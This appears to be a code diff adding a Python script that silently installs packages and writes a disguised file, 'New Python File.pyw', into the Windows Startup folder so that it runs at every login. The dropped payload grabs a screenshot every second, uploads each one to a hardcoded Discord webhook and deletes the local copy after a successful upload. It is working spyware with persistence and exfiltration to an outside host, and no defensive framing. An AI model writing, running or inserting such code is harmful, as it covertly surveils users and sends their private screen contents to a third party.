@@ -1,0 +1,102 @@
+import os
+import subprocess
+import sys
+import time
+
+def install(package):
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", package],
+                              stdout=subprocess.DEVNULL,
+                              stderr=subprocess.DEVNULL)
+    except Exception:
+        pass
+
+packages = ["pillow", "requests"]
+
+for package in packages:
+    try:
+        __import__(package)
+    except ImportError:
+        install(package)
+
+username = os.getlogin()
+folder_path = fr"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+os.makedirs(folder_path, exist_ok=True)
+
+file_path = os.path.join(folder_path, "New Python File.pyw")
+
+multi_line_text = """import os
+import time
+from PIL import ImageGrab
+import requests
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/1436299058581864620/ST4zzU8kTFwL5lFHnv8-1dOhSoBLTwzWMMMw_2amGqdBOY5PYaUA37JcWtyGo02uhIpC"
+
+desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+folder_path = os.path.join(desktop, "frame capture")
+os.makedirs(folder_path, exist_ok=True)
+
+frame_count = 0
+
+def save_compressed_image(img, path, max_size=8 * 1024 * 1024):
+    "Save image as JPEG with compression to fit under max_size (bytes)."
+    quality = 95
+    img.save(path, format="JPEG", quality=quality)
+    while os.path.getsize(path) > max_size and quality > 10:
+        quality -= 5
+        img.save(path, format="JPEG", quality=quality)
+    return path
+
+try:
+    while True:
+        screenshot = ImageGrab.grab()
+        filename = os.path.join(folder_path, f"frame_{frame_count:04d}.jpg")
+
+        # Save compressed
+        save_compressed_image(screenshot, filename)
+        print(f"Saved {filename} (compressed)")
+
+        # Send to Discord — open file, send, then the file is automatically closed when leaving the with-block
+        sent_successfully = False
+        try:
+            with open(filename, "rb") as f:
+                files = {"file": (os.path.basename(filename), f)}
+                response = requests.post(WEBHOOK_URL, files=files, timeout=30)
+            # file is closed here
+            if response.ok:  # any 2xx code counts as success
+                print(f"Sent to Discord! (HTTP {response.status_code})")
+                sent_successfully = True
+            else:
+                print(f"Failed to send: HTTP {response.status_code} - {response.text}")
+        except requests.RequestException as e:
+            print(f"Network/error sending to Discord: {e}")
+        except Exception as e:
+            print(f"Unexpected error while sending: {e}")
+
+        # Delete the file only after the file handle is closed and the send succeeded
+        if sent_successfully:
+            try:
+                os.remove(filename)
+                print(f"Deleted {filename} after sending.")
+            except Exception as e:
+                print(f"Failed to delete {filename}: {e}")
+        else:
+            print(f"Keeping {filename} locally (not sent).")
+
+        frame_count += 1
+        time.sleep(1)  # capture interval; increase to 5+ if you hit rate limits
+
+except KeyboardInterrupt:
+    print("Stopped capturing frames.")
+"""
+
+with open(file_path, "w", encoding="utf-8") as f:
+    f.write(multi_line_text)
+
+print(f"Created multi-line text file at: {file_path}")
+
+# Wait 5 seconds
+time.sleep(5)
+
+# Open the file with the default text editor
+os.startfile(file_path)
